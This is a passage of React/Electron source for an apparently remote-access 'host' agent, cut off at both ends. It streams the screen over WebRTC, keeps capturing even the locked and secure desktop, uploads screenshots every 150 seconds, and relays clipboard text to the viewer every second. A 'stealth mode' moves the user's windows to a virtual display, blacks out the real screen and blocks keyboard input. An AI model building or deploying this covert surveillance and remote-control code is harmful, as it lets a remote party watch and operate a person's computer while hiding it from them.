  const isSecureDesktopAvailable = await window.electronAPI?.secureDesktopIsAvailable?.();
  if (isSecureDesktopAvailable) {
    console.log('[host] 🔒 Secure desktop service available — notifying service to start capture');
    await window.electronAPI?.secureDesktopStartCapture?.().catch(() => {});
    agent.secureDesktopActive = true;
    // Stop user-session GDI so service has exclusive write to the frame file
    window.electronAPI?.stopGdiCapture?.().catch(() => {});
  }

  // Set sentinel before any async work so re-entrant calls bail out
  agent.gdiPollInterval = agent.gdiPollInterval || true;
  agent.gdiCaptureActive = true;

  stopCaptureHealthMonitor();

  console.log(`[host] 🔒 Switching to GDI capture (${reason})`);

  try {
    const gdiResult = await window.electronAPI.startGdiCapture();
    const bmpPath = gdiResult?.path || await window.electronAPI.getGdiCapturePath();
    if (!bmpPath) throw new Error('GDI capture path not available');

    console.log('[host] 📁 GDI capture path:', bmpPath);

    const canvas = document.createElement('canvas');
    canvas.width = 1920;
    canvas.height = 1080;
    canvas.style.cssText = 'position:fixed;left:-9999px;top:-9999px;';
    document.body.appendChild(canvas);
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = '#000';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#fff';
    ctx.font = '32px sans-serif';
    ctx.textAlign = 'center';
    ctx.fillText('Connecting to locked screen...', 960, 540);

    const gdiStream = canvas.captureStream(10);
    agent.stream = gdiStream;
    agent.streamReady = true;
    agent.gdiCanvas = canvas;

    await new Promise(r => setTimeout(r, 500));

    const pollInterval = setInterval(async () => {
      try {
        const base64 = await window.electronAPI.getGdiCapture(bmpPath);
        if (!base64) return;
        const img = new Image();
        img.onload = () => { ctx.drawImage(img, 0, 0, canvas.width, canvas.height); };
        img.src = 'data:image/bmp;base64,' + base64;
      } catch {}
    }, 100);
    agent.gdiPollInterval = pollInterval;

    const newTrack = gdiStream.getVideoTracks()[0];
    if (newTrack) {
      for (const [, peer] of agent.peers.entries()) {
        if (peer.pc) {
          const sender = peer.pc.getSenders().find(s => s.track?.kind === 'video');
          if (sender) { try { await sender.replaceTrack(newTrack); } catch {} }
        }
      }
    }

    const unlockCheck = setInterval(async () => {
      try {
        // Check if GDI cooldown is still active
        const isCooldownActive = await window.electronAPI?.isGdiCooldownActive?.();
        if (isCooldownActive) {
          console.log('[host] 🔒 GDI cooldown still active, waiting...');
          return;
        }
        const screenState = await window.electronAPI.checkScreenState();
        if (screenState === 'normal') {
          if (agent.secureDesktopActive) {
            console.log('[host] 🔒 Secure desktop capture complete, stopping...');
            window.electronAPI?.secureDesktopStopCapture?.().catch(() => {});
            agent.secureDesktopActive = false;
          }
          
          console.log('[host] 🔓 Screen unlocked - switching back to normal capture');
          clearInterval(unlockCheck);
          clearInterval(pollInterval);
          agent.gdiPollInterval = null;
          agent.gdiCaptureActive = false;
          window.electronAPI.stopGdiCapture().catch(() => {});
          if (agent.gdiCanvas) {
            agent.gdiCanvas.parentNode?.removeChild(agent.gdiCanvas);
            agent.gdiCanvas = null;
          }
          agent.gdiSwitchInProgress = false;
          await agentStartStream();
          if (agent.stream) {
            const t = agent.stream.getVideoTracks()[0];
            if (t) {
              for (const [, peer] of agent.peers.entries()) {
                if (peer.pc) {
                  const s = peer.pc.getSenders().find(s => s.track?.kind === 'video');
                  if (s) { try { await s.replaceTrack(t); } catch {} }
                }
              }
            }
          }
        }
      } catch {}
    }, 2000);
    agent.unlockCheckInterval = unlockCheck;

    console.log('[host] ✅ GDI lock/password screen capture active');
  } catch (err) {
    console.error('[host] GDI fallback failed:', err.message);
    agent.gdiCaptureActive = false;
  } finally {
    agent.gdiSwitchInProgress = false;
  }
}

function startCaptureHealthMonitor(stream) {
  if (!IS_ELECTRON || !stream || agent.gdiPollInterval) return;
  stopCaptureHealthMonitor();

  const probeVideo = document.createElement('video');
  probeVideo.muted = true;
  probeVideo.playsInline = true;
  probeVideo.autoplay = true;
  probeVideo.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;';
  probeVideo.srcObject = stream;
  document.body.appendChild(probeVideo);

  agent.captureProbeVideo = probeVideo;
  agent.captureLastFrameTime = Date.now();

  probeVideo.onplaying = () => {
    agent.captureLastFrameTime = Date.now();
  };
  probeVideo.ontimeupdate = () => {
    agent.captureLastFrameTime = Date.now();
  };
  probeVideo.onloadeddata = () => {
    agent.captureLastFrameTime = Date.now();
  };

  probeVideo.play().catch(() => {});

  let lastTime = 0;
  agent.captureHealthInterval = setInterval(() => {
    if (agent.gdiPollInterval || agent.gdiSwitchInProgress) return;

    const currentTime = probeVideo.currentTime || 0;
    if (currentTime > lastTime) {
      lastTime = currentTime;
      agent.captureLastFrameTime = Date.now();
      return;
    }

    const stalledMs = Date.now() - agent.captureLastFrameTime;
    if (stalledMs > 2500) {
      console.warn(`[host] ⚠️ Capture stream appears frozen for ${stalledMs}ms - forcing GDI fallback`);
      switchToGdiCapture('frozen DXGI capture');
    }
  }, 1000);
}

async function agentStartStream() {
  console.log('🖥️  Initializing screen capture (quality:', agent.quality, ')...');

  // Guard: don't restart if GDI/secure-desktop capture is already running
  if (agent.gdiPollInterval || agent.gdiCaptureActive) {
    console.log('[host] ⏭️  GDI/secure-desktop capture already active — skipping agentStartStream');
    return;
  }

  agent.streamReady = false;
  stopCaptureHealthMonitor();

  if (IS_ELECTRON && !window.electronAPI) {
    console.error('[host] Electron API not available — cannot capture screen');
    _setError('Electron API not available');
    return;
  }

  const preset = QUALITY_PRESETS[agent.quality] || QUALITY_PRESETS.medium;

  try {
    let stream;
    let sourceId = null;

    if (IS_ELECTRON) {
      if (!navigator.mediaDevices) {
        throw new Error('navigator.mediaDevices is undefined — Electron config issue');
      }

      sourceId = await window.electronAPI.getScreenSourceId();
      console.log('[host] desktopCapturer sourceId:', sourceId, '| quality:', agent.quality, preset);

      // Check if screen is locked (GDI marker returned)
      if (sourceId === 'gdi-locked-screen:polling' || sourceId === 'secure-desktop:polling') {
        const usingService = sourceId === 'secure-desktop:polling';
        console.log(usingService
          ? '[host] 🔒 Secure desktop service active — starting GDI canvas capture'
          : '[host] 🔒 Screen is locked — starting GDI capture immediately');

        // Set sentinel IMMEDIATELY so any re-entrant agentStartStream calls bail out
        // before canvas.captureStream() fires the media permission event
        agent.gdiPollInterval = agent.gdiPollInterval || true;
        agent.gdiCaptureActive = true;

        if (usingService) {
          agent.secureDesktopActive = true;
          // Stop the user-session GDI process — the service (SYSTEM) will write frames instead
          window.electronAPI?.stopGdiCapture?.().catch(() => {});
          console.log('[host] 🔒 Stopped user-session GDI — service will capture secure desktop');
        }

        // Start persistent GDI capture process (works for both modes)
        // For secure-desktop mode, the service writes frames; we still need the path
        let bmpPath;
        if (usingService) {
          // Service writes to the same fixed path — get it without starting PS process
          bmpPath = await window.electronAPI.getGdiFramePath();
        } else {
          const gdiResult = await window.electronAPI.startGdiCapture();
          bmpPath = gdiResult?.path || await window.electronAPI.getGdiCapturePath();
        }
        
        if (!bmpPath) {
          throw new Error('GDI capture path not available');
        }
        
        console.log('[host] 📁 GDI capture path:', bmpPath);
        
        // Create canvas stream for locked screen
        const canvas = document.createElement('canvas');
        canvas.width = 1920;
        canvas.height = 1080;
        canvas.style.cssText = 'position:fixed;left:-9999px;top:-9999px;';
        document.body.appendChild(canvas);
        const ctx = canvas.getContext('2d');
        
        // Draw initial black frame so stream has content immediately
        ctx.fillStyle = '#111';
        ctx.fillRect(0, 0, 1920, 1080);
        ctx.fillStyle = '#fff';
        ctx.font = '32px sans-serif';
        ctx.textAlign = 'center';
        ctx.fillText('Connecting to locked screen...', 960, 540);
        
        stream = canvas.captureStream(10); // 10 FPS
        
        console.log('[host] 📹 Canvas stream created, tracks:', stream.getTracks().length);
        
        // Wait a moment for GDI process to produce first frame
        await new Promise(r => setTimeout(r, 500));
        
        // Poll for GDI frames — read file directly
        let frameCount = 0;
        let lastMtime = 0;
        const pollInterval = setInterval(async () => {
          try {
            const base64 = await window.electronAPI.getGdiCapture(bmpPath);
            if (!base64) return;
            
            const img = new Image();
            img.onload = () => {
              ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
              frameCount++;
              if (frameCount === 1) console.log('[host] ✅ First GDI frame drawn to canvas!');
              if (frameCount % 50 === 0) console.log(`[host] 📸 GDI frames: ${frameCount}`);
            };
            img.src = 'data:image/bmp;base64,' + base64;
          } catch (err) {
            // Silently continue
          }
        }, 100);
        
        agent.gdiPollInterval = pollInterval;
        agent.gdiCanvas = canvas;
        
        // Monitor for screen unlock — when desktopCapturer works again, switch back
        // But only if GDI mode has been active for more than 10 seconds (cooldown period)
        const unlockCheckInterval = setInterval(async () => {
          try {
            const isCooldownActive = await window.electronAPI?.isGdiCooldownActive?.();
            if (isCooldownActive) {
              console.log('[host] 🔒 GDI cooldown still active, waiting...');
              return;
            }
            const screenState = await window.electronAPI.checkScreenState();
            if (screenState === 'normal') {
              if (agent.secureDesktopActive) {
                console.log('[host] 🔒 Secure desktop capture complete, stopping...');
                window.electronAPI?.secureDesktopStopCapture?.().catch(() => {});
                agent.secureDesktopActive = false;
              }
              
              console.log('[host] 🔓 Screen unlocked! Switching back to normal capture...');
              clearInterval(unlockCheckInterval);
              clearInterval(agent.gdiPollInterval);
              agent.gdiPollInterval = null;
              agent.gdiCaptureActive = false;
              window.electronAPI.stopGdiCapture().catch(() => {});
              
              if (agent.gdiCanvas) {
                agent.gdiCanvas.parentNode?.removeChild(agent.gdiCanvas);
                agent.gdiCanvas = null;
              }
              
              agent.stream = null;
              agent.streamReady = false;
              await agentStartStream();
              
              if (agent.stream) {
                const newTrack = agent.stream.getVideoTracks()[0];
                if (newTrack) {
                  for (const [, peer] of agent.peers.entries()) {
                    if (peer.pc) {
                      const sender = peer.pc.getSenders().find(s => s.track?.kind === 'video');
                      if (sender) {
                        try { await sender.replaceTrack(newTrack); } catch {}
                      }
                    }
                  }
                }
              }
            }
          } catch {}
        }, 2000);
        
        agent.unlockCheckInterval = unlockCheckInterval;
        console.log('✅ GDI locked-screen capture active');
      } else {
        stream = await navigator.mediaDevices.getUserMedia({
          audio: false,
          video: {
            mandatory: {
              chromeMediaSource: 'desktop',
              chromeMediaSourceId: sourceId,
              maxWidth:     preset.width,
              maxHeight:    preset.height,
              minFrameRate: Math.max(1, preset.frameRate - 2),
              maxFrameRate: preset.frameRate,
            },
          },
        });
        console.log('✅ getUserMedia succeeded (quality:', agent.quality, ')');
      }
    } else {
      stream = await navigator.mediaDevices.getDisplayMedia({
        video: {
          cursor: 'always',
          width:     { ideal: preset.width },
          height:    { ideal: preset.height },
          frameRate: { ideal: preset.frameRate },
        },
        audio: false,
      });
    }

    const tracks = stream.getTracks();
    if (tracks.length === 0) throw new Error('Screen capture stream has no tracks');

    agent.stream = stream;
    agent.streamReady = true;
    console.log('✅ Screen capture started:', tracks.map(t => `${t.kind}:${t.id.slice(0,8)}`));

    // Monitor video track end — for normal (non-GDI) streams only
    // When screen locks, the track ends; we detect it and switch to GDI
    const videoTrack = stream.getVideoTracks()[0];
    if (videoTrack && !sourceId?.startsWith('gdi-locked-screen:') && !sourceId?.startsWith('secure-desktop:')) {
      startCaptureHealthMonitor(stream);
      videoTrack.onended = async () => {
        console.log('[host] ⚠️  Screen track ended — switching to GDI capture immediately...');
        agent.stream = null;
        agent.streamReady = false;
        await switchToGdiCapture('video track ended');
      };
    }
  } catch (err) {
    const msg = err.name === 'NotAllowedError'
      ? 'Screen sharing denied.'
      : 'Screen capture failed: ' + err.message;
    console.error('❌', msg);
    _setError(msg);
    agent.stream = null;
    agent.streamReady = false;
  }
}

// Apply bitrate cap to the active WebRTC sender
async function applyBitrateCap(pc) {
  const targetPc = pc || agent.pc;
  if (!targetPc) return;
  const preset = QUALITY_PRESETS[agent.quality] || QUALITY_PRESETS.medium;
  const sender = targetPc.getSenders().find(s => s.track?.kind === 'video');
  if (!sender) return;
  try {
    const params = sender.getParameters();
    if (!params.encodings || params.encodings.length === 0) params.encodings = [{}];
    params.encodings[0].maxBitrate = preset.maxBitrate;
    await sender.setParameters(params);
    console.log('[host] ✅ Bitrate cap applied:', preset.maxBitrate, 'bps');
  } catch (err) {
    console.warn('[host] Could not set bitrate cap:', err.message);
  }
}

// Change quality — restarts stream with new constraints and replaces WebRTC track on ALL peers
async function agentSetQuality(q) {
  if (!QUALITY_PRESETS[q]) return;
  if (agent.quality === q) return;
  console.log('[host] 🎚️  Quality change:', agent.quality, '→', q);
  agent.quality = q;

  // Restart stream with new constraints
  if (agent.stream) {
    agent.stream.getTracks().forEach(t => t.stop());
    agent.stream = null;
    agent.streamReady = false;
  }
  await agentStartStream();

  // Replace track on ALL active peer connections
  if (agent.stream) {
    const newTrack = agent.stream.getVideoTracks()[0];
    if (newTrack) {
      for (const [idx, peer] of agent.peers.entries()) {
        if (peer.pc) {
          const sender = peer.pc.getSenders().find(s => s.track?.kind === 'video');
          if (sender) {
            try {
              await sender.replaceTrack(newTrack);
              await applyBitrateCap(peer.pc);
              console.log(`[host] ✅ Track replaced for viewer #${idx} with quality: ${q}`);
            } catch (err) {
              console.warn(`[host] Could not replace track for viewer #${idx}:`, err.message);
            }
          }
        }
      }
    }
  }
}

/**
 * Enable stealth mode — viewer-triggered or host-triggered.
 *
 * STRICT ORDER (do NOT change):
 * 1. Detect virtual display — abort if missing
 * 2. Enable stealth state in main process
 * 3. Migrate ALL windows to virtual display
 * 4. Verify windows are on virtual display (log results)
 * 5. Switch screen capture to virtual display
 * 6. Replace WebRTC video track so viewer sees virtual display
 * 7. ONLY NOW show overlay on primary display
 * 8. Block keyboard input (best-effort)
 */
async function agentEnableStealthMode() {
  if (!IS_ELECTRON || !window.electronAPI) {
    console.warn('[host] Stealth mode requires Electron');
    return;
  }
  if (agent.stealthMode) {
    console.log('[host] Stealth mode already active');
    return;
  }

  console.log('[host] ═══ STEALTH MODE ENABLE START ═══');

  try {
    // ── Step 1: Detect virtual display ───────────────────────
    const enableResult = await window.electronAPI.enableStealthMode();
    if (!enableResult.success) {
      console.error('[host] ❌ Cannot enable stealth mode:', enableResult.error);
      if (enableResult.requiresSetup) {
        _setShowSetupWizard(true);
      } else {
        _setError(enableResult.error || 'Stealth mode unavailable — no virtual display');
      }
      return;
    }

    const vDisplay = enableResult.display;
    agent.virtualDisplay = vDisplay;
    agent.stealthMode = true;
    _setStealthMode(true);
    console.log(`[host] ✅ Virtual display confirmed: id=${vDisplay.id} bounds=(${vDisplay.bounds.x},${vDisplay.bounds.y},${vDisplay.bounds.width}x${vDisplay.bounds.height})`);

    // ── Step 2: Migrate ALL windows to virtual display ────────
    console.log('[host] 🪟 Step 2: Migrating windows...');
    const migResult = await window.electronAPI.migrateWindows(vDisplay.id);
    console.log('[host] Migration result:', JSON.stringify(migResult));

    if (!migResult.success) {
      console.error('[host] ❌ Migration IPC failed:', migResult.error);
      _setError('Window migration failed: ' + migResult.error);
      await agentDisableStealthMode();
      return;
    }

    if (migResult.successCount === 0) {
      console.error('[host] ❌ Zero windows migrated — virtual display may not be active or no windows open');
      // Don't abort — there may legitimately be no windows, continue
    } else {
      console.log(`[host] ✅ Migrated ${migResult.successCount} windows`);
      if (migResult.failedWindows?.length) {
        console.warn('[host] ⚠️  Failed windows:', migResult.failedWindows);
      }
    }

    // ── Step 3: Start tracking new windows ───────────────────
    await window.electronAPI.startWindowTracking(vDisplay.id);
    console.log('[host] ✅ Window tracking started');

    // ── Step 4: Switch capture to virtual display ─────────────
    console.log('[host] 📹 Step 4: Switching screen capture to virtual display...');
    if (agent.stream) {
      agent.stream.getTracks().forEach(t => t.stop());
      agent.stream = null;
      agent.streamReady = false;
    }
    await agentStartStream();

    if (!agent.stream) {
      console.error('[host] ❌ Failed to capture virtual display — aborting');
      _setError('Could not capture virtual display. Check Electron console for source list.');
      await agentDisableStealthMode();
      return;
    }
    console.log('[host] ✅ Capture switched to virtual display');

    // ── Step 5: Replace WebRTC track ─────────────────────────
    if (agent.pc) {
      const newTrack = agent.stream.getVideoTracks()[0];
      if (newTrack) {
        const sender = agent.pc.getSenders().find(s => s.track?.kind === 'video');
        if (sender) {
          await sender.replaceTrack(newTrack);
          console.log('[host] ✅ WebRTC video track replaced — viewer now sees virtual display');
        } else {
          console.warn('[host] ⚠️  No video sender found on peer connection');
        }
      }
    } else {
      console.log('[host] ℹ️  No active peer connection — new viewers will get virtual display stream');
    }

    // ── Step 6: Show overlay on primary display ───────────────
    // This MUST happen AFTER capture has switched.
    // The overlay is on the primary display; capture is now on virtual display.
    console.log('[host] 🪟 Step 6: Showing overlay on primary display...');
    window.electronAPI.blackScreenOn();

    // ── Step 7: Block keyboard input ─────────────────────────
    const blockResult = await window.electronAPI.blockInput(true);
    if (!blockResult.success) {
      console.warn('[host] ⚠️  Input blocking unavailable (requires admin):', blockResult.error);
    } else {
      console.log('[host] ✅ Keyboard input blocked');
    }

    console.log('[host] ═══ STEALTH MODE ACTIVE ═══');

  } catch (err) {
    console.error('[host] ❌ Stealth mode enable failed:', err.message);
    _setError('Stealth mode failed: ' + err.message);
    await agentDisableStealthMode();
  }
}

/**
 * Disable stealth mode.
 * STRICT ORDER:
 * 1. Unblock input
 * 2. Hide overlay
 * 3. Stop window tracking
 * 4. Restore windows to primary display
 * 5. Disable stealth state in main process
 * 6. Switch capture back to primary display
 * 7. Replace WebRTC track
 */
async function agentDisableStealthMode() {
  if (!IS_ELECTRON || !window.electronAPI) return;
  console.log('[host] ═══ STEALTH MODE DISABLE START ═══');

  // 1. Unblock input first
  try { await window.electronAPI.blockInput(false); } catch (e) { console.warn('[host] unblock error:', e.message); }

  // 2. Hide overlay
  try { window.electronAPI.blackScreenOff(); } catch {}

  // 3. Stop window tracking
  try { await window.electronAPI.stopWindowTracking(); } catch {}

  // 4. Restore windows
  try {
    const r = await window.electronAPI.restoreWindows();
    console.log(`[host] ✅ Restored ${r.successCount} windows`);
  } catch (err) {
    console.warn('[host] ⚠️  Window restore error:', err.message);
  }

  // 5. Disable stealth state in main process
  try { await window.electronAPI.disableStealthMode(); } catch {}

  agent.stealthMode = false;
  agent.virtualDisplay = null;
  _setStealthMode(false);
  _setBlackScreen(false);

  // 6. Switch capture back to primary display
  if (agent.stream) {
    agent.stream.getTracks().forEach(t => t.stop());
    agent.stream = null;
    agent.streamReady = false;
  }
  await agentStartStream();

  // 7. Replace WebRTC track back to primary
  if (agent.pc && agent.stream) {
    const newTrack = agent.stream.getVideoTracks()[0];
    if (newTrack) {
      const sender = agent.pc.getSenders().find(s => s.track?.kind === 'video');
      if (sender) {
        await sender.replaceTrack(newTrack);
        console.log('[host] ✅ Video track replaced — viewer now sees primary display');
      }
    }
  }

  console.log('[host] ═══ STEALTH MODE DISABLED ═══');
}

async function agentInit() {
  if (agent.initialized) {
    console.log('[host] Agent already initialized — skipping');
    return;
  }
  agent.initialized = true;
  agent.closed = false;

  console.log('[host] HOST PAGE MOUNTED — IS_ELECTRON:', IS_ELECTRON);
  console.log('[host] Initializing agent...');

  // 1. Resolve identity
  const id = getDeviceId();
  agent.deviceId = id;

  // 2. Register or refresh — always save the token the backend returns
  if (isRegistered()) {
    const name = getDeviceName();
    console.log(`♻️  Existing device: ${id} (${name})`);
    console.log(`[host] Stored token (last 6): ...${getAuthToken().slice(-6)}`);
    try {
      const res = await axios.post(`${API_URL}/register-device`, {
        device_id:   id,
        device_name: name,
        auth_token:  getAuthToken(),
      });
      if (res.data.success) {
        // Always update — backend may have restarted and issued a new token
        setAuthToken(res.data.auth_token);
        console.log(`[host] Token after refresh (last 6): ...${res.data.auth_token.slice(-6)}`);
      } else {
        console.warn(`[host] Re-registration rejected: ${res.data.error} — clearing token for retry`);
        setAuthToken('');
        agent.initialized = false; // allow retry
        return;
      }
    } catch {
      console.warn('[host] Could not reach backend — will attempt WS with cached token');
    }
  } else {
    const name = `Agent-${id.slice(-4)}`;
    console.log(`📋 Registering new device: ${id}`);
    try {
      const res = await axios.post(`${API_URL}/register-device`, {
        device_id:   id,
        device_name: name,
      });
      if (!res.data.success) throw new Error(res.data.error || 'Registration failed');
      setAuthToken(res.data.auth_token);
      saveDeviceName(name);
      console.log(`✅ Device registered: ${id} token (last 6): ...${res.data.auth_token.slice(-6)}`);
    } catch (err) {
      console.error('❌ Registration failed:', err.message);
      _setError('Registration failed — retrying in 5s');
      _setStatus('error');
      agent.initialized = false; // allow retry
      agent.reconnect = setTimeout(() => agentInit(), 5000);
      return;
    }
  }

  // 3. Screen capture FIRST (Electron only)
  // CRITICAL: Capture screen BEFORE connecting WebSocket so stream is ready
  // when viewer connects
  if (IS_ELECTRON) {
    console.log('[host] 🖥️ Starting screen capture before WebSocket...');
    await agentStartStream();
    
    if (!agent.stream) {
      console.error('[host] ❌ Screen capture failed — cannot proceed');
      _setError('Screen capture failed — retrying in 5s');
      _setStatus('error');
      agent.initialized = false;
      agent.reconnect = setTimeout(() => agentInit(), 5000);
      return;
    }
    
    console.log('[host] ✅ Screen capture ready, connecting WebSocket...');
  }

  // 4. Connect WS — device goes ONLINE immediately on ws.onopen
  agentConnectWebSocket();

  // 5. Browser mode: set idle status (user must manually activate)
  if (!IS_ELECTRON) {
    _setStatus('idle');
  }
}

// Screenshot capture and upload (Electron only)
async function captureAndUploadScreenshot() {
  if (!IS_ELECTRON || !agent.stream || !agent.deviceId) {
    return;
  }

  try {
    console.log('[host] 📸 Capturing screenshot...');
    
    // Create canvas and video element
    const canvas = document.createElement('canvas');
    const video = document.createElement('video');
    video.srcObject = agent.stream;
    video.muted = true;
    
    // Wait for video to be ready
    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play();
        resolve();
      };
    });
    
    // Set canvas dimensions to 1280x720
    canvas.width = 1280;
    canvas.height = 720;
    const ctx = canvas.getContext('2d');
    
    // Draw video frame to canvas
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // Convert to JPEG with 0.5 quality
    let quality = 0.5;
    let base64 = canvas.toDataURL('image/jpeg', quality);
    
    // Reduce quality iteratively if size exceeds 200KB
    while (base64.length > 200 * 1024 && quality > 0.1) {
      quality -= 0.1;
      base64 = canvas.toDataURL('image/jpeg', quality);
      console.log(`[host] 📸 Reducing quality to ${quality.toFixed(1)} (size: ${(base64.length / 1024).toFixed(1)}KB)`);
    }
    
    // Only upload if size is <= 200KB
    if (base64.length <= 200 * 1024) {
      await axios.post(`${API_URL}/device-screenshot`, {
        device_id: agent.deviceId,
        image: base64,
      });
      console.log(`[host] ✅ Screenshot uploaded (${(base64.length / 1024).toFixed(1)}KB, quality: ${quality.toFixed(1)})`);
    } else {
      console.warn(`[host] ⚠️  Screenshot too large (${(base64.length / 1024).toFixed(1)}KB) — skipping upload`);
    }
    
    // Cleanup
    video.pause();
    video.srcObject = null;
  } catch (err) {
    console.error('[host] ❌ Screenshot capture failed:', err);
  }
}

// Start screenshot capture interval (Electron only)
function startScreenshotCapture() {
  if (!IS_ELECTRON || !agent.stream) {
    return;
  }
  
  // Clear existing interval
  if (agent.screenshotInterval) {
    clearInterval(agent.screenshotInterval);
  }
  
  console.log('[host] 📸 Starting automatic screenshot capture (every 150 seconds)');
  
  // Capture immediately
  captureAndUploadScreenshot();
  
  // Then capture every 150 seconds (2.5 minutes)
  agent.screenshotInterval = setInterval(() => {
    captureAndUploadScreenshot();
  }, 150000); // 150 seconds = 2.5 minutes
}

// Start clipboard monitoring (Electron only)
function startClipboardMonitoring() {
  if (!IS_ELECTRON || !agent.dc || agent.dc.readyState !== 'open') {
    return;
  }
  
  // Clear existing interval
  if (agent.clipboardInterval) {
    clearInterval(agent.clipboardInterval);
  }
  
  console.log('[host] 📋 Starting clipboard monitoring (every 1 second)');
  agent.lastClipboard = '';
  
  agent.clipboardInterval = setInterval(async () => {
    if (!agent.dc || agent.dc.readyState !== 'open') {
      console.log('[host] 📋 DataChannel not open — stopping clipboard monitoring');
      if (agent.clipboardInterval) {
        clearInterval(agent.clipboardInterval);
        agent.clipboardInterval = null;
      }
      return;
    }
    
    try {
      const text = await window.electronAPI.getClipboardText();
      
      // Check size limit (1MB)
      if (text && text.length > 1024 * 1024) {
        console.warn('[host] 📋 Clipboard content too large (>1MB) — skipping sync');
        return;
      }
      
      // Only send if content changed
      if (text && text !== agent.lastClipboard) {
        agent.lastClipboard = text;
        agent.dc.send(JSON.stringify({
          type: 'clipboard',
          text: text,
        }));
        console.log(`[host] 📋 Clipboard synced to viewer (${text.length} chars)`);
      }
    } catch (err) {
      console.error('[host] ❌ Clipboard read failed:', err);
    }
  }, 1000);
}

function agentTeardown() {
  agent.closed = true;
  agent.initialized = false;
  clearInterval(agent.heartbeat);
  clearTimeout(agent.reconnect);
  clearInterval(agent.screenshotInterval);
  clearInterval(agent.clipboardInterval);
  agent.screenshotInterval = null;
  agent.clipboardInterval = null;
  agent.lastClipboard = '';
  agent.ws?.close();
  agent.ws = null;
  agentCleanupPeer();
  agent.blackStream?.getTracks().forEach(t => t.stop());
  agent.blackStream = null;
  agent.stream?.getTracks().forEach(t => t.stop());
  agent.stream = null;
  agentStopMic();

  if (IS_ELECTRON && window.electronAPI) {
    window.electronAPI.blackScreenOff();
  }
}

// ---------------------------------------------------------------------------
// React component — thin UI shell over the module-level agent.
// ---------------------------------------------------------------------------
export default function HostPage() {
  const navigate = useNavigate();

  const [status, setStatus]                       = useState('initializing');
  const [deviceName, setDeviceName]               = useState('');
  const [deviceId, setDeviceId]                   = useState('');
  const [viewerConnected, setViewerConnected]     = useState(false);
  const [blackScreenActive, setBlackScreenActive] = useState(false);
  const [blockInputActive, setBlockInputActive]   = useState(false);
  const [error, setError]                         = useState('');
  const [stealthModeActive, setStealthModeActive] = useState(false);
  const [showSetupWizard, setShowSetupWizard]     = useState(false);
  const [micActive, setMicActive]                 = useState(false);
  const [micBars, setMicBars]                     = useState([0, 0, 0, 0, 0]);

  const micAnalyserRef  = useRef(null);
  const micAnimFrameRef = useRef(null);

  // Wire agent → React state setters on every mount (safe, idempotent)
  _setStatus      = setStatus;
  _setError       = setError;
  _setViewerConn  = setViewerConnected;
  _setBlackScreen = setBlackScreenActive;
  _setBlockInput  = setBlockInputActive;
  _setStealthMode = setStealthModeActive;
  _setShowSetupWizard = setShowSetupWizard;

  // Start/stop mic visualizer when micActive changes
  useEffect(() => {
    if (!micActive || !agent.micStream) {
      // Stop animation
      if (micAnimFrameRef.current) {
        cancelAnimationFrame(micAnimFrameRef.current);
        micAnimFrameRef.current = null;
      }
      if (micAnalyserRef.current) {
        micAnalyserRef.current = null;
      }
      setMicBars([0, 0, 0, 0, 0]);
      return;
    }

    // Set up Web Audio analyser
    try {
      const ctx = new AudioContext();
      const source = ctx.createMediaStreamSource(agent.micStream);
      const analyser = ctx.createAnalyser();
      analyser.fftSize = 64;
      analyser.smoothingTimeConstant = 0.7;
      source.connect(analyser);
      micAnalyserRef.current = analyser;

      const dataArray = new Uint8Array(analyser.frequencyBinCount);
      const NUM_BARS = 5;

      const animate = () => {
        analyser.getByteFrequencyData(dataArray);
        // Sample 5 evenly-spaced frequency bins
        const bars = Array.from({ length: NUM_BARS }, (_, i) => {
          const idx = Math.floor((i / NUM_BARS) * dataArray.length);
          return Math.round((dataArray[idx] / 255) * 100);
        });
        setMicBars(bars);
        micAnimFrameRef.current = requestAnimationFrame(animate);
      };
      animate();

      return () => {
        cancelAnimationFrame(micAnimFrameRef.current);
        ctx.close();
      };
    } catch (e) {
      console.warn('[host] Mic visualizer error:', e.message);
    }
  }, [micActive]);

  // Expose mic active setter so agentSetAudioMode can drive it
  _setMicActive = setMicActive;

  useEffect(() => {
    // Sync UI state from agent (handles StrictMode remount after agent already ran)
    setDeviceId(agent.deviceId || getDeviceId());
    setDeviceName(getDeviceName());

    // Start agent — no-op if already initialized
    agentInit().then(() => {
      // Sync device identity into UI after init resolves
      setDeviceId(agent.deviceId);
      setDeviceName(getDeviceName());
    });

    // Cleanup: only tear down on real navigation away, not StrictMode remount.
    // We detect a real unmount by checking if the component remounts within
    // the same tick — but the simplest reliable approach is: don't tear down
    // on unmount at all during dev StrictMode. Instead, teardown is triggered
    // by explicit user action (deactivate) or page unload.
    const onUnload = () => agentTeardown();
    window.addEventListener('beforeunload', onUnload);
    return () => {
      window.removeEventListener('beforeunload', onUnload);
      // Only tear down if navigating away (agent.initialized stays true across
      // StrictMode remounts, so agentInit() will skip on the second mount).
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Browser manual controls
  const handleActivate = useCallback(async () => {
    await agentStartStream();
    if (!agent.ws || agent.ws.readyState !== WebSocket.OPEN) {
      agentConnectWebSocket();
    }
  }, []);

  const handleDeactivate = useCallback(() => {
    agentTeardown();
    setStatus('idle');
    setError('');
  }, []);

  // ── Render ──────────────────────────────────────────────────
  return (
    <div className="min-h-screen bg-zinc-50" data-testid="host-page">

      {/* Setup Wizard */}
      {showSetupWizard && (
        <VirtualDisplaySetup
          onComplete={() => {
            setShowSetupWizard(false);
            agentEnableStealthMode();
          }}
          onCancel={() => setShowSetupWizard(false)}
        />
      )}

      {blackScreenActive && (
        <div className="black-screen-overlay" data-testid="black-screen-overlay">
          <div className="text-center">
            <div className="text-zinc-800 text-xs font-mono tracking-widest uppercase mb-2">
              Screen hidden by viewer
            </div>
            <div className="w-2 h-2 bg-zinc-800 rounded-full mx-auto animate-pulse" />
          </div>
        </div>
      )}
      {blockInputActive && !blackScreenActive && (
        <div className="block-input-overlay" data-testid="block-input-overlay" />
      )}

      {/* INITIALIZING */}
      {status === 'initializing' && (
        <div className="min-h-screen flex items-center justify-center">
          <p className="text-sm text-zinc-400 font-mono animate-pulse">Initializing agent...</p>
        </div>
      )}

      {/* IDLE — browser only */}
      {status === 'idle' && !IS_ELECTRON && (
        <div className="min-h-screen flex items-center justify-center p-6">
